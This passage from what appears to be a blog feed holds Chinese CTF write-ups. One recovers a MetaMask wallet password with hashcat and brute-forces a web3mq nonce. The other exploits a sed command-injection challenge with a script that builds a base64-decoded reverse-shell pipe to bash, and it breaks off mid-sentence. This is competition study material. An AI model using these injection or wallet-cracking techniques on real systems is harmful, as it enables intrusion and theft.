<span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SHARED_ARRAY_BUFFER_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_shared_array_buffer(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SHARED_WASM_MEMORY_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, self.read_shared_wasm_memory(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.TYPED_ARRAY_OBJECT:</span><br><span class="line">array_type = self.<span class="built_in">input</span>.read()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_typed_array(array_type, data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.DATA_VIEW_OBJECT:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_data_view(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.MAP_OBJECT:</span><br><span class="line">obj = JSMapObj()</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SET_OBJECT:</span><br><span class="line">obj = JSSetObj()</span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag == DataType.SAVED_FRAME_OBJECT:</span><br><span class="line">obj = self.read_saved_frame(data)  <span class="comment">#<span class="doctag">XXX:</span> TODO</span></span><br><span class="line">self.objs.append(obj)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, obj</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> tag &lt; <span class="built_in">int</span>(DataType.FLOAT_MAX):</span><br><span class="line"><span class="comment"># Reassemble double floating point value</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, struct.unpack(<span class="string">&quot;=d&quot;</span>, struct.pack(<span class="string">&quot;=q&quot;</span>, (tag &lt;&lt; <span class="number">32</span>) | data))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> DataType.TYPED_ARRAY_V1_MIN &lt;= tag &lt;= DataType.TYPED_ARRAY_V1_MAX:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>, self.read_typed_array(tag - DataType.TYPED_ARRAY_V1_MIN, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#return False, False</span></span><br><span class="line"><span class="keyword">raise</span> ParseError(<span class="string">&quot;Unsupported type&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;A parser for the Mozilla variant of Snappy frame format.&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># This Source Code Form is subject to the terms of the Mozilla Public</span></span><br><span class="line"><span class="comment"># License, v. 2.0. If a copy of the MPL was not distributed with this</span></span><br><span class="line"><span class="comment"># file, You can obtain one at http://mozilla.org/MPL/2.0/.</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment">#   – Python source code by Erin Yuki Schlarb, 2024.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections.abc <span class="keyword">as</span> cabc</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> typing <span class="keyword">as</span> ty</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cramjam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress_raw</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="string">&quot;&quot;&quot;Decompress a raw Snappy chunk without any framing&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># Delegate this part to the cramjam library</span></span><br><span class="line"><span class="keyword">return</span> cramjam.snappy.decompress_raw(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decompressor</span>(io.BufferedIOBase):</span><br><span class="line">inner: io.BufferedIOBase</span><br><span class="line"></span><br><span class="line">_buf: <span class="built_in">bytearray</span></span><br><span class="line">_buf_len: <span class="built_in">int</span></span><br><span class="line">_buf_pos: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, inner: io.BufferedIOBase</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">assert</span> inner.readable()</span><br><span class="line">self.inner = inner</span><br><span class="line">self._buf = <span class="built_in">bytearray</span>(<span class="number">65536</span>)</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readable</span>(<span class="params">self</span>) -&gt; ty.<span class="type">Literal</span>[<span class="literal">True</span>]:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_read_next_data_chunk</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="comment"># We start with the buffer empty</span></span><br><span class="line"><span class="keyword">assert</span> self._buf_len == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Keep parsing chunks until something is added to the buffer</span></span><br><span class="line"><span class="keyword">while</span> self._buf_len == <span class="number">0</span>:</span><br><span class="line"><span class="comment"># Read chunk header</span></span><br><span class="line">header = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(header) == <span class="number">0</span>:</span><br><span class="line"><span class="comment"># EOF – buffer remains empty</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(header) != <span class="number">4</span>:</span><br><span class="line"><span class="comment"># Just part of a header being present is invalid</span></span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading Snappy chunk header&quot;</span>)</span><br><span class="line"><span class="built_in">type</span>, length = header[<span class="number">0</span>], <span class="built_in">int</span>.from_bytes(header[<span class="number">1</span>:<span class="number">4</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">0xFF</span>:</span><br><span class="line"><span class="comment"># Stream identifier – contents should be checked but otherwise ignored</span></span><br><span class="line"><span class="keyword">if</span> length != <span class="number">6</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid stream identifier (wrong length)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read and verify required content is present</span></span><br><span class="line">content = self.inner.read(length)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(content) != <span class="number">6</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading stream identifier&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content != <span class="string">b&quot;sNaPpY&quot;</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid stream identifier (wrong content)&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">0x00</span>:</span><br><span class="line"><span class="comment"># Compressed data</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Read checksum</span></span><br><span class="line">checksum: <span class="built_in">bytes</span> = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(checksum) != <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data checksum&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read compressed data into new buffer</span></span><br><span class="line">compressed: <span class="built_in">bytes</span> = self.inner.read(length - <span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(compressed) != length - <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data contents&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decompress data into inner buffer</span></span><br><span class="line"><span class="comment">#<span class="doctag">XXX:</span> There does not appear to an efficient way to set the length</span></span><br><span class="line"><span class="comment">#     of a bytearray</span></span><br><span class="line">self._buf_len = cramjam.snappy.decompress_raw_into(compressed, self._buf)</span><br><span class="line"></span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> Verify checksum</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">0x01</span>:</span><br><span class="line"><span class="comment"># Uncompressed data</span></span><br><span class="line"><span class="keyword">if</span> length &gt; <span class="number">65536</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid uncompressed data chunk (length &gt; 65536)&quot;</span>)</span><br><span class="line"></span><br><span class="line">checksum: <span class="built_in">bytes</span> = self.inner.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(checksum) != <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data checksum&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read chunk data into buffer</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">memoryview</span>(self._buf) <span class="keyword">as</span> view:</span><br><span class="line"><span class="keyword">if</span> self.inner.readinto(view[:(length - <span class="number">4</span>)]) != length - <span class="number">4</span>:</span><br><span class="line"><span class="keyword">raise</span> EOFError(<span class="string">&quot;Unexpected EOF while reading data contents&quot;</span>)</span><br><span class="line">self._buf_len = length - <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#<span class="doctag">TODO:</span> Verify checksum</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x80</span>, <span class="number">0xFE</span> + <span class="number">1</span>):</span><br><span class="line"><span class="comment"># Padding and reserved skippable chunks – just skip the contents</span></span><br><span class="line"><span class="keyword">if</span> self.inner.seekable():</span><br><span class="line">self.inner.seek(length, io.SEEK_CUR)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self.inner.read(length)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unexpected unskippable reserved chunk: 0x<span class="subst">&#123;<span class="built_in">type</span>:02X&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read1</span>(<span class="params">self, size: ty.<span class="type">Optional</span>[<span class="built_in">int</span>] = -<span class="number">1</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="comment"># Read another chunk if the buffer is currently empty</span></span><br><span class="line"><span class="keyword">if</span> self._buf_len &lt; <span class="number">1</span>:</span><br><span class="line">self._read_next_data_chunk()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Return some of the data currently present in the buffer</span></span><br><span class="line">start = self._buf_pos</span><br><span class="line"><span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> size &lt; <span class="number">0</span>:</span><br><span class="line">end = self._buf_len</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">end = <span class="built_in">min</span>(start + size, self._buf_len)</span><br><span class="line"></span><br><span class="line">result: <span class="built_in">bytes</span> = <span class="built_in">bytes</span>(self._buf[start:end])</span><br><span class="line"><span class="keyword">if</span> end &lt; self._buf_len:</span><br><span class="line">self._buf_pos = end</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: ty.<span class="type">Optional</span>[<span class="built_in">int</span>] = -<span class="number">1</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">buf: <span class="built_in">bytearray</span> = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> size &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(data := self.read1()) &gt; <span class="number">0</span>:</span><br><span class="line">buf += data</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buf) &lt; size <span class="keyword">and</span> <span class="built_in">len</span>(data := self.read1(size - <span class="built_in">len</span>(buf))) &gt; <span class="number">0</span>:</span><br><span class="line">buf += data</span><br><span class="line"><span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readinto1</span>(<span class="params">self, buf: cabc.<span class="type">Sequence</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="comment"># Read another chunk if the buffer is currently empty</span></span><br><span class="line"><span class="keyword">if</span> self._buf_len &lt; <span class="number">1</span>:</span><br><span class="line">self._read_next_data_chunk()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy some of the data currently present in the buffer</span></span><br><span class="line">start = self._buf_pos</span><br><span class="line">end = <span class="built_in">min</span>(start + <span class="built_in">len</span>(buf), self._buf_len)</span><br><span class="line"></span><br><span class="line">buf[<span class="number">0</span>:(end - start)] = self._buf[start:end]</span><br><span class="line"><span class="keyword">if</span> end &lt; self._buf_len:</span><br><span class="line">self._buf_pos = end</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self._buf_len = <span class="number">0</span></span><br><span class="line">self._buf_pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> end - start</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readinto</span>(<span class="params">self, buf: cabc.<span class="type">Sequence</span>[<span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">memoryview</span>(buf) <span class="keyword">as</span> view:</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(buf) <span class="keyword">and</span> (length := self.readinto1(view[pos:])) &gt; <span class="number">0</span>:</span><br><span class="line">pos += length</span><br><span class="line"><span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;492&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> ff:</span><br><span class="line">d = Decompressor(ff)</span><br><span class="line">decoded = d.read()</span><br><span class="line">decodedStr = decoded.decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(decodedStr)</span><br></pre></td></tr></table></figure><p>实际上也可以直接在010里找到我们需要的有关数据</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924160616244.png"alt="image-20240924160616244" /><figcaption aria-hidden="true">image-20240924160616244</figcaption></figure><p>前面加上{"data"，提取出这一段</p><p>利用hashcat自带的工具metamask2hashcat.py将其转换为hash的形式，kali上这个脚本在/usr/share/hashcat/tools/的路径下</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924161701427.png"alt="image-20240924161701427" /><figcaption aria-hidden="true">image-20240924161701427</figcaption></figure><p>由于metamask更新了加密策略，所以要引入额外的<ahref="https://github.com/flyinginsect271/MetamaskHashcatModule">模块</a>再用hashcat爆破，字典就是之前得到的password.txt，下载下来的模块放在/usr/share/hashcat/modules路径下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 26650 2.txt passwords.txt --force</span><br></pre></td></tr></table></figure><p>得到密码silversi</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924172838415.png"alt="image-20240924172838415" /><figcaption aria-hidden="true">image-20240924172838415</figcaption></figure><p>然后用metamask官方的<ahref="https://metamask.github.io/vault-decryptor/">解密网站</a>得到助记词</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924181017291.png"alt="image-20240924181017291" /><figcaption aria-hidden="true">image-20240924181017291</figcaption></figure><p>接下来就可以通过助记词进入钱包账户</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924181436001.png"alt="image-20240924181436001" /><figcaption aria-hidden="true">image-20240924181436001</figcaption></figure><p>翻找之前解压idb文件得到的内容，找到这样的一条进行hex解码</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924201614599.png"alt="image-20240924201614599" /><figcaption aria-hidden="true">image-20240924201614599</figcaption></figure><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924202447303.png"alt="image-20240924202447303" /><figcaption aria-hidden="true">image-20240924202447303</figcaption></figure><p>这里记录的是一个web3mq的会话，其中的nonce遵循如下格式</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha3_224(`$web3mq$&#123;did_type&#125;:$&#123;did_value&#125;$&#123;keyIndex&#125;$&#123;password&#125;web3mq$`)</span><br></pre></td></tr></table></figure><p>通过类似上述操作，我们可以在其他地方找到如下信息</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">did_type: eth</span><br><span class="line">did_value: 0xd1abc6113bda0269129c0faa2bd0c9c1bb512be6（即钱包地址，这里全小写）</span><br><span class="line">keyIndex: 1</span><br></pre></td></tr></table></figure><p>于是可以写脚本，用之前的passwords.txt作字典爆破得到password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha3_224</span>(<span class="params">string</span>):</span><br><span class="line">        sha3 = hashlib.sha3_224()</span><br><span class="line">        string = <span class="string">&quot;$web3mqeth:0xd1abc6113bda0269129c0faa2bd0c9c1bb512be61&quot;</span>+string+<span class="string">&quot;web3mq$&quot;</span></span><br><span class="line">        sha3.update(string.encode())</span><br><span class="line">        <span class="keyword">return</span> sha3.hexdigest()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bruteforce_sha3_224</span>(<span class="params">target_hash, wordlist</span>):</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> wordlist:</span><br><span class="line">            computed_hash = sha3_224(word)</span><br><span class="line">            <span class="keyword">if</span> computed_hash == target_hash:</span><br><span class="line">                <span class="keyword">return</span> word</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    target_Nonce = <span class="string">&quot;Mzk2ZDBiNTVmZjkyMGRkYTVkNTFjMTQ3ODU4YTM1NDc4ZGE1NjExMTllYmRiYWE4MzQyM2M3YzI=&quot;</span></span><br><span class="line">    target_hash = base64.b64decode(target_Nonce).decode()</span><br><span class="line">    wordlist = <span class="built_in">open</span>(<span class="string">&quot;passwords.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;target_hash: &quot;</span>, target_hash)</span><br><span class="line">    original_string = bruteforce_sha3_224(target_hash, wordlist)</span><br><span class="line">    <span class="keyword">if</span> original_string:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found original string: <span class="subst">&#123;original_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No match found in the wordlist.&quot;</span>)</span><br></pre></td></tr></table></figure><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924203158501.png"alt="image-20240924203158501" /><figcaption aria-hidden="true">image-20240924203158501</figcaption></figure><p>接下来登录web3mq即可</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924212246005.png"alt="image-20240924212246005" /><figcaption aria-hidden="true">image-20240924212246005</figcaption></figure><p>由于rpc很不稳定，试了N次以后终于是进去了。。。pull一下最近的聊天记录即可看到flag</p><figure><img src="/images/WMCTF2024-部分Misc-复现/image-20240924215222361.png"alt="image-20240924215222361" /><figcaption aria-hidden="true">image-20240924215222361</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> WMCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTF2024初赛 部分Misc 复现</title>
      <link href="/posts/fd611e56/"/>
      <url>/posts/fd611e56/</url>
      
        <content type="html"><![CDATA[<blockquote><p>又是一次爆零的比赛。。。还是太菜了，还得多练。</p></blockquote><h3 id="bash-game">Bash Game</h3><blockquote><p>比赛的时候本以为这是唯一一道可能做出来的题，赛后看了wp才知道，即使最开始那个字符限制给我侥幸绕过了，后面也是狠狠坐牢。。。</p></blockquote><p>题目主要文件</p><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;ByteCTF/lib/cmd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/update&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">result := Update(c)</span><br><span class="line">c.String(<span class="number">200</span>, result)</span><br><span class="line">&#125;)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Welcome to BashGame&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;:23333&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> OpsPath = <span class="string">&quot;/opt/challenge/ops.sh&quot;</span></span><br><span class="line"><span class="keyword">const</span> CtfPath = <span class="string">&quot;/opt/challenge/ctf.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">(c *gin.Context)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">username := c.PostForm(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">6</span> &#123;</span><br><span class="line">_, err := cmd.Exec(<span class="string">&quot;/bin/bash&quot;</span>, OpsPath, username)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err.Error()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ret, err := cmd.Exec(<span class="string">&quot;/bin/bash&quot;</span>, CtfPath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err.Error()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ops.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># -----------params------------</span></span><br><span class="line">name=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">switch_domain</span></span>() &#123;</span><br><span class="line">    conf_file=<span class="string">&quot;/opt/challenge/ctf.sh&quot;</span></span><br><span class="line">    sed -i <span class="string">&quot;s/Bytectf.*!/Bytectf, <span class="variable">$name</span>!/&quot;</span> <span class="string">&quot;<span class="variable">$conf_file</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">switch_domain</span><br></pre></td></tr></table></figure><p>ctf.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> welcome to Bytectf, username!</span><br></pre></td></tr></table></figure><p>题目的逻辑是向/updatepost传参一个name，这个name的值会替换掉ctf.sh中的username，并且ctf.sh会被执行。</p><p>很显然就是要用这个name传入我们要执行的命令，但是题目中对输入的内容长度进行了检测，必须小于6。然而，用来表示内容是命令的反引号已经占掉了两个字符，也就是说得在三字符内构造出我们需要的命令。</p><p>写脚本，每次传一个字符，同时用#注释掉!，最终构成我们的反弹shell的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">rs = requests.Session()</span><br><span class="line">url_base = <span class="string">&#x27;http://xxx.clsadp.com&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_char</span>(<span class="params">char</span>):</span><br><span class="line">    url = url_base + <span class="string">&quot;/update&quot;</span></span><br><span class="line">    param = <span class="string">&#x27;\\0&#x27;</span>+char+<span class="string">&#x27;/#&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(param)&lt;<span class="number">6</span></span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>: param&#125;</span><br><span class="line">    response = rs.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    command = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    `echo &quot;（这里写自己的反弹shell命令的base64编码）&quot;|base64 -d|bash`</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.strip()</span><br><span class="line">    command = command[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> command:</span><br><span class="line">    add_char(char)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/ByteCTF2024初赛-部分Misc-复现/image-20240923002401672.png"alt="image-20240923002401672" /><figcaption aria-hidden="true">image-20240923002401672</figcaption></figure><p>这里我们是ctf用户，也没法使用sudo，使用sudo 